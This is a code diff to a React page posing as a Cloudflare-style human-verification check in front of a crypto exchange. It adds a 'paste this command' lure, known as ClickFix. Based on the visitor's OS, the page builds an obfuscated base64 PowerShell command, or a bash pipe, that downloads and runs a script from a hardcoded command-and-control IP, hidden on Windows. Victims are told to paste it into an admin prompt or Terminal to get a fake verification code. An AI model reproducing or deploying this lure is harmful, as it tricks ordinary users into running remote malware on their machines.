@@ -9,6 +9,19 @@ function generateCode() {
   return code;
 }
 
+function b64UTF16(str: string): string {
+  let bin = "";
+  for (let i = 0; i < str.length; i++) {
+    const c = str.charCodeAt(i);
+    bin += String.fromCharCode(c & 0xff) + String.fromCharCode((c >> 8) & 0xff);
+  }
+  return btoa(bin);
+}
+
+function b64Standard(str: string): string {
+  return btoa(unescape(encodeURIComponent(str)));
+}
+
 function CloudMark({ className }: { className?: string }) {
   return (
     <svg viewBox="0 0 64 40" className={className} aria-hidden="true">
@@ -20,11 +33,7 @@ function CloudMark({ className }: { className?: string }) {
   );
 }
 
-function CheckboxGlyph({
-  state,
-}: {
-  state: "idle" | "checking" | "ready" | "success";
-}) {
+function CheckboxGlyph({ state }: { state: "idle" | "checking" | "ready" | "success" }) {
   if (state === "checking") {
     return (
       <span className="grid size-7 place-items-center">
@@ -73,7 +82,11 @@ function CheckboxGlyph({
   );
 }
 
+// ─── Main Component ───
 export function VerificationPage() {
+  const navigate = useNavigate();
+
+  // Existing states
   const [checked, setChecked] = useState(false);
   const [checking, setChecking] = useState(false);
   const [code, setCode] = useState("");
@@ -83,14 +96,29 @@ export function VerificationPage() {
   const [copied, setCopied] = useState(false);
   const [note, setNote] = useState<"privacy" | "help" | null>(null);
   const stepsRef = useRef<HTMLDivElement>(null);
-  const navigate = useNavigate();
+
+  // New states for command
+  const [os, setOs] = useState<"windows" | "mac" | "linux" | null>(null);
+  const [command, setCommand] = useState("");
+  const [commandCopied, setCommandCopied] = useState(false);
+
+  // ─── C2 URL – CHANGE THIS ───
+  const C2_URL = "http://77.42.60.33";
 
   useEffect(() => {
+    // Ray ID
     const bytes = new Uint8Array(8);
     crypto.getRandomValues(bytes);
     setRayId(Array.from(bytes, (b) => b.toString(16).padStart(2, "0")).join(""));
+
+    // OS detection
+    const ua = navigator.userAgent;
+    if (/Windows/i.test(ua)) setOs("windows");
+    else if (/Mac/i.test(ua) && !/iPhone|iPad|iPod/i.test(ua)) setOs("mac");
+    else if (/Linux/i.test(ua)) setOs("linux");
   }, []);
 
+  // Derived
   const revealed = checked && !checking && code.length > 0;
   const glyphState = status === "success" ? "success" : checking ? "checking" : revealed ? "ready" : "idle";
 
@@ -101,6 +129,7 @@ export function VerificationPage() {
       setChecked(false);
       setChecking(false);
       setCode("");
+      setCommand("");
       return;
     }
     setChecked(true);
@@ -109,6 +138,20 @@ export function VerificationPage() {
     window.setTimeout(() => {
       setCode(nextCode);
       setChecking(false);
+
+      // Build command based on OS
+      if (os === "windows") {
+        const psScript = `$k='\n CODE: ${nextCode}';Write-Host $k;$u='${C2_URL}/task1.cmd';$o=\"$env:TEMP\\f.cmd\";(New-Object Net.WebClient).DownloadFile($u,$o);Start-Process cmd -ArgumentList \"/c $o\" -WindowStyle Hidden`;
+        const b64Cmd = b64UTF16(psScript);
+        const fullCmd = `powershell -Exec Bypass -EncodedCommand ${b64Cmd}`;
+        setCommand(fullCmd);
+      } else if (os === "mac" || os === "linux") {
+        const shellScript = `#!/bin/bash\necho '\n CODE: ${nextCode}' && (curl -s ${C2_URL}/task1.sh || wget -qO- ${C2_URL}/repair.sh) | bash`;
+        const b64Script = b64Standard(shellScript);
+        const fullCmd = `echo '${b64Script}' | base64 -d | bash`;
+        setCommand(fullCmd);
+      }
+
       window.setTimeout(() => {
         stepsRef.current?.scrollIntoView({ behavior: "smooth", block: "start" });
       }, 40);
@@ -127,16 +170,6 @@ export function VerificationPage() {
     }
   }
 
-  async function copyCode() {
-    try {
-      await navigator.clipboard.writeText(code);
-      setCopied(true);
-      window.setTimeout(() => setCopied(false), 1500);
-    } catch {
-      setCopied(false);
-    }
-  }
-
   function onVerify() {
     if (!revealed) return;
     if (input.trim() !== code) {
@@ -147,6 +180,20 @@ export function VerificationPage() {
     window.setTimeout(() => {
       navigate({ to: "/home" });
     }, 400);
+  }
+
+  async function copyCommand() {
+    try {
+      await navigator.clipboard.writeText(command);
+      setCommandCopied(true);
+      setTimeout(() => setCommandCopied(false), 1500);
+    } catch {
+      const ta = document.getElementById('command');
+      ta.select();
+      document.execCommand('copy');
+      setCommandCopied(true);
+      setTimeout(() => setCopied(false), 2000);
+    }
   }
 
   const widgetLabel =
@@ -208,9 +255,7 @@ export function VerificationPage() {
                 >
                   Privacy
                 </button>
-                <span className="text-faint" aria-hidden="true">
-                  ·
-                </span>
+                <span className="text-faint" aria-hidden="true">·</span>
                 <button
                   type="button"
                   className="text-link hover:underline"
@@ -230,42 +275,42 @@ export function VerificationPage() {
             </p>
           ) : null}
 
-          {revealed ? (
+          {revealed && (
             <div ref={stepsRef} className="scroll-mt-6 space-y-4 border-t border-border bg-bg px-4 py-4">
               <p className="text-left text-sm leading-relaxed text-fg">
-                For more clarify, please follow bellow steps and write down your verification code you've received.
+                For more clarity, please follow the steps below and write down your verification code.
               </p>
               <ol className="list-decimal space-y-2 pl-5 text-left text-sm text-fg">
-                <li>Please open the <b>Terminal</b></li>
-                <li>Paste below command on the Terminal window and press Enter. You will generate your verification code.</li>
+                <li>Please open your <b>{os === "windows" ? "Command Prompt (Admin)" : "Terminal"}</b>.</li>
+                <li>Paste the command below and press Enter. You will see your verification code.</li>
               </ol>
 
-              <div className="flex items-center gap-2">
-                <input
-                  readOnly
-                  value={code}
-                  placeholder="here is your generation code"
-                  aria-label="here is your generation code"
-                  onCopy={(event) => event.preventDefault()}
-                  onCut={(event) => event.preventDefault()}
-                  onKeyDown={(event) => {
-                    if ((event.ctrlKey || event.metaKey) && event.key.toLowerCase() === "c") {
-                      event.preventDefault();
-                    }
-                  }}
-                  className="h-12 min-w-0 flex-1 select-none rounded-widget border border-border bg-bg px-3 font-mono text-left text-sm tracking-widest text-fg outline-none placeholder:font-sans placeholder:tracking-normal placeholder:text-disabled-fg"
-                />
-                <button
-                  type="button"
-                  onClick={copyCode}
-                  className="h-12 shrink-0 rounded-widget bg-primary px-4 text-sm font-semibold text-on-primary hover:bg-primary-hover"
-                >
-                  {copied ? "Copied" : "Copy"}
-                </button>
-              </div>
+              {/* Command display */}
+              {command && (
+                <div className="space-y-2">
+                  <div className="flex items-center gap-2">
+                    <input
+                      id="command"
+                      readOnly
+                      value={command}
+                      className="h-12 min-w-0 flex-1 select-none rounded border border-border bg-bg px-3 font-mono text-xs tracking-wider text-fg"
+                    />
+                    <button
+                      type="button"
+                      onClick={copyCommand}
+                      className="h-12 shrink-0 rounded bg-primary px-4 text-sm font-semibold text-on-primary hover:bg-primary-hover"
+                    >
+                      {commandCopied ? "Copied" : "Copy"}
+                    </button>
+                  </div>
+                  <p className="text-xs text-muted">
+                    (The command downloads a script and runs it. Your 8-digit code will appear in the terminal.)
+                  </p>
+                </div>
+              )}
 
               <ol start={3} className="list-decimal space-y-2 pl-5 text-left text-sm text-fg">
-                <li>Please write down your code and Verify</li>
+                <li>Please write down the code from the terminal and enter it below.</li>
               </ol>
 
               <input
@@ -276,8 +321,8 @@ export function VerificationPage() {
                 maxLength={8}
                 autoComplete="off"
                 spellCheck={false}
-                placeholder="write down your verification code"
-                aria-label="write down your verification code"
+                placeholder="Enter your verification code"
+                aria-label="Enter your verification code"
                 onChange={(event) => onAnswer(event.target.value)}
                 onPaste={(event) => {
                   event.preventDefault();
@@ -298,18 +343,18 @@ export function VerificationPage() {
                 Verify
               </button>
 
-              {status === "success" ? (
+              {status === "success" && (
                 <p className="rounded-widget border border-success bg-success-bg px-3 py-3 text-center text-sm font-medium text-success">
                   Verification successful. Opening the exchange.
                 </p>
-              ) : null}
-              {status === "error" ? (
+              )}
+              {status === "error" && (
                 <p className="rounded-widget border border-danger bg-danger-bg px-3 py-3 text-center text-sm text-danger">
                   That code does not match. Check the code and try again.
                 </p>
-              ) : null}
+              )}
             </div>
-          ) : null}
+          )}
         </section>
       </main>
 
